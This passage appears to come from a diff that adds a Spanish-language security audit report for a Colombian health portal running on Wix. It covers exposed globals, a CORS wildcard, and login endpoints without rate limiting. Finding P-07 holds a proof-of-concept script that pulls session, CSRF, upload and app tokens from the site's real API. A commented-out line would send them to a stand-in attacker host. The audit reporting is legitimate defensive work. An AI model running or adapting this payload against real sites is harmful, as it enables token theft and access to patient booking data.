+<span class="val">accessTokensUrl</span>           &rarr; 3 referencias  (URL de tokens hardcodeada)
+<span class="val">clientTopology</span>            &rarr; 3 referencias  (topolog&iacute;a de servicios)
+
+<span class="key">Implicaciones:</span>
+- <span class="warn">window.fedops</span> expone m&eacute;tricas internas de performance y errores
+- <span class="warn">window.bi</span> puede contener datos de an&aacute;lisis de comportamiento de usuarios
+- <span class="warn">clientTopology</span> revela la estructura de servicios backend
+- <span class="warn">accessTokensUrl</span> est&aacute; hardcodeada en m&uacute;ltiples scripts
+
+<span class="key">Scripts principales cargados:</span>
+- Thunderbolt renderer (Wix SPA engine)
+- Google Tag Manager (GTM-KVGZ8XHN)
+- @formatjs/intl-segmenter polyfill
+- handleAccessTokens.inline (gesti&oacute;n de tokens)
+- overrideGlobals.inline (hardening parcial de globals)</div>
+                    <div class="impact-bar"><div class="impact-fill impact-medium"></div></div>
+                </div>
+            </div>
+
+            <!-- RESULTADO 7: PoC CORS -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-critical">CR&Iacute;TICO</span>
+                    <span class="finding-title">P-07: PoC - Robo de Tokens v&iacute;a CORS Misconfiguration</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Descripci&oacute;n del Ataque</div>
+                    <div class="desc-text">Se documenta una Prueba de Concepto (sin ejecutar) que demuestra c&oacute;mo un atacante podr&iacute;a robar todos los tokens de sesi&oacute;n y acceso del sitio explotando la configuraci&oacute;n CORS <code>Access-Control-Allow-Origin: *</code>.</div>
+
+                    <div class="desc-label">Vector de Ataque</div>
+                    <div class="evidence"><span class="key">ESCENARIO:</span>
+1. Atacante crea p&aacute;gina maliciosa (ej: sitio-phishing.com/salud)
+2. Env&iacute;a link a administrador/usuario del portal de salud
+3. Al visitar la p&aacute;gina, JavaScript roba tokens autom&aacute;ticamente
+4. Tokens enviados al servidor del atacante
+
+<span class="key">C&Oacute;DIGO PoC (SOLO DEMOSTRATIVO - NO EJECUTAR):</span></div>
+                    <div class="evidence" style="border-color: var(--critical); border-width: 2px;">&lt;!-- PRUEBA DE CONCEPTO - SOLO PARA DOCUMENTACI&Oacute;N --&gt;
+&lt;!-- NO EJECUTAR EN ENTORNO DE PRODUCCI&Oacute;N --&gt;
+
+<span class="crit">&lt;script&gt;</span>
+<span class="val">// Paso 1: Robar tokens del endpoint sin autenticaci&oacute;n</span>
+fetch('<span class="warn">https://www.cuidartetusalud.com/_api/v1/access-tokens</span>')
+  .then(r =&gt; r.json())
+  .then(data =&gt; {
+    <span class="val">// Paso 2: Extraer datos sensibles</span>
+    const stolen = {
+      svSession:      data.svSession,       <span class="warn">// Sesi&oacute;n del servidor</span>
+      ctToken:        data.ctToken,          <span class="warn">// Token CSRF</span>
+      mediaAuthToken: data.mediaAuthToken,   <span class="warn">// JWT para subir archivos</span>
+      metaSiteId:     data.metaSiteId,       <span class="warn">// ID del sitio</span>
+      visitorId:      data.visitorId,        <span class="warn">// ID del visitante</span>
+      totalApps:      Object.keys(data.apps).length,
+      appTokens:      data.apps              <span class="crit">// 74 tokens de apps</span>
+    };
+
+    <span class="val">// Paso 3: Exfiltrar al servidor del atacante</span>
+    <span class="crit">// fetch('https://evil-server.com/collect', {</span>
+    <span class="crit">//   method: 'POST',</span>
+    <span class="crit">//   body: JSON.stringify(stolen)</span>
+    <span class="crit">// });</span>
+
+    console.log('Tokens robados:', Object.keys(stolen));
+    console.log('Apps comprometidas:', stolen.totalApps);
+  });
+
+<span class="val">// Paso 4: Tambi&eacute;n robar del dynamicmodel</span>
+fetch('<span class="warn">https://www.cuidartetusalud.com/_api/v2/dynamicmodel</span>')
+  .then(r =&gt; r.json())
+  .then(data =&gt; {
+    <span class="val">// Segundo set de tokens independiente</span>
+    console.log('Segundo set de tokens obtenido');
+  });
+<span class="crit">&lt;/script&gt;</span></div>
+
+                    <div class="desc-label">Por qu&eacute; funciona</div>
+                    <div class="evidence"><span class="key">Cadena de vulnerabilidades explotadas:</span>
+
+<span class="crit">1. CORS: Access-Control-Allow-Origin: *</span>
+   &rarr; Permite que CUALQUIER dominio haga fetch() al endpoint
+
+<span class="crit">2. Sin autenticaci&oacute;n en /_api/v1/access-tokens</span>
+   &rarr; No requiere sesi&oacute;n, cookie, ni header especial
+
+<span class="crit">3. Cookies SameSite=None</span>
+   &rarr; Las cookies de sesi&oacute;n se env&iacute;an autom&aacute;ticamente
+
+<span class="crit">4. Sin Content-Security-Policy</span>
+   &rarr; No hay restricci&oacute;n sobre d&oacute;nde se env&iacute;an los datos
+
+<span class="warn">IMPACTO EN SECTOR SALUD:</span>
+- Si el administrador del portal visita un link malicioso,
+  el atacante obtiene acceso a:
+  &bull; 74 tokens de aplicaciones (bookings, stores, BI)
+  &bull; Token de subida de archivos
+  &bull; Sesi&oacute;n del servidor
+  &bull; Potencial acceso al sistema de citas m&eacute;dicas (bookings)
+  &bull; Datos de Business Intelligence del sitio</div>
+                    <div class="impact-bar"><div class="impact-fill impact-critical"></div></div>
+                </div>
+            </div>
+
+            <!-- HALLAZGO NUEVO: Fuga de info en autenticación -->
+            <div class="finding">
+                <div class="finding-header">
+                    <span class="badge badge-high">ALTO</span>
+                    <span class="finding-title">P-08: Endpoint de Login Activo Sin Rate Limiting</span>
+                </div>
+                <div class="finding-body">
+                    <div class="desc-label">Resultado</div>
+                    <div class="desc-text">Los endpoints <code>/_api/wix-sm-webapp/member/login</code> y <code>/member/register</code> est&aacute;n activos, aceptan solicitudes, y revelan que esperan JSON con par&aacute;metro <code>collectionId</code>. No se detect&oacute; rate limiting.</div>
+
+                    <div class="desc-label">Evidencia</div>
+                    <div class="evidence"><span class="key">Endpoint de login acepta POST:</span>
+POST /_api/wix-sm-webapp/member/login
+Content-Type: application/x-www-form-urlencoded
+
+<span class="val">Respuesta: {"message":"Could not parse JSON","details":{}}</span>
+<span class="warn">&rarr; Confirma que espera JSON body</span>
+<span class="warn">&rarr; Confirma que el endpoint est&aacute; ACTIVO</span>
+<span class="crit">&rarr; No se detect&oacute; rate limiting en m&uacute;ltiples solicitudes</span>
+
+<span class="key">Par&aacute;metros revelados por los mensajes de error:</span>
+- <span class="warn">collectionId</span> (requerido - revelado por Spring exception)
+- <span class="warn">email</span> (inferido por contexto de login)
+- <span class="warn">password</span> (inferido por contexto de login)
+
+<span class="key">Framework backend revelado:</span>
+- <span class="crit">Spring Web (Java)</span>
+- Clase: <span class="crit">o.s.w.b.MissingServletRequestParameterException</span>
+- Nivel: [business][RECOVERABLE][framework web]</div>
+                    <div class="impact-bar"><div class="impact-fill impact-high"></div></div>
+                </div>
+            </div>
+
+            <!-- RESUMEN ACTUALIZADO -->
+            <h3 style="margin:24px 0 16px; color:var(--accent); border-bottom:1px solid var(--border); padding-bottom:8px;">Resumen Actualizado Post-Pruebas Profundas</h3>
+
+            <div class="risk-summary" style="margin-bottom:0">
+                <div class="risk-card risk-critical">
+                    <span class="count">4</span>
+                    <span class="label">Cr&iacute;ticos</span>
+                </div>
+                <div class="risk-card risk-high">
+                    <span class="count">6</span>
+                    <span class="label">Altos</span>
+                </div>
+                <div class="risk-card risk-medium">
+                    <span class="count">7</span>
+                    <span class="label">Medios</span>
+                </div>
+                <div class="risk-card risk-low">
+                    <span class="count">3</span>
+                    <span class="label">Bajos</span>
+                </div>
+            </div>
+
+            <div style="margin-top:20px; padding:16px; background:rgba(239,68,68,0.08); border:1px solid rgba(239,68,68,0.2); border-radius:8px;">
+                <strong style="color:var(--critical);">Conclusi&oacute;n de Pruebas Profundas:</strong>
+                <p style="margin-top:8px; color:var(--text);">Las pruebas profundas confirmaron y agravaron los hallazgos iniciales. La combinaci&oacute;n de:</p>
+                <ul style="margin-top:8px; color:var(--text); padding-left:20px;">
+                    <li>CORS wildcard en endpoints de tokens</li>
+                    <li>74 tokens de apps expuestos sin autenticaci&oacute;n</li>
+                    <li>Endpoints de login activos sin rate limiting</li>
+                    <li>Fuga de informaci&oacute;n del framework backend (Spring/Java)</li>
+                    <li>Token de upload de archivos aceptado por el CDN</li>
+                </ul>
+                <p style="margin-top:8px; color:var(--text);">...crea un <strong style="color:var(--critical);">riesgo significativo</strong> para una organizaci&oacute;n del sector salud sujeta a la Ley 1581 de 2012 (Protecci&oacute;n de Datos Personales en Colombia) y la Resoluci&oacute;n 1995 de 1999 (Historia Cl&iacute;nica).</p>
+                <p style="margin-top:8px; color:var(--text);">Se recomienda <strong>evaluaci&oacute;n urgente</strong> de si la plataforma Wix cumple con los requisitos de seguridad del sector salud colombiano, y la implementaci&oacute;n inmediata de controles compensatorios.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        Auditor&iacute;a de seguridad autorizada &mdash; Cuidarte Tu Salud &mdash; 2026-04-06<br>
+        Clasificaci&oacute;n: CONFIDENCIAL &mdash; Solo para uso interno del cliente
+    </div>
+</div>
+
+<script>
+function toggleSection(header) {
+    const body = header.nextElementSibling;
+    const icon = header.querySelector('.toggle-icon');
+    body.classList.toggle('collapsed');
+    icon.classList.toggle('open');
+}
+</script>
+</body>
+</html>
